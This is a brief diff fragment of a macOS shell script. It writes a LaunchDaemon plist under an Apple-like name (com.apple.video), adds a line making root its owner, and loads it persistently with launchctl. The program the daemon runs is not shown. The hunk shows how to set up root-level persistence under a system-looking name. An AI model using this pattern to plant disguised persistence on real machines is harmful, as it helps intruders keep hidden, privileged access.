@@ -38,7 +38,7 @@ echo '
     </dict>
 </plist>
 ' > /Library/LaunchDaemons/com.apple.video.plist
-
+chown root /Library/LaunchDaemons/com.apple.video.plist
 #Load the LaunchAgent
 launchctl load -w /Library/LaunchDaemons/com.apple.video.plist
 
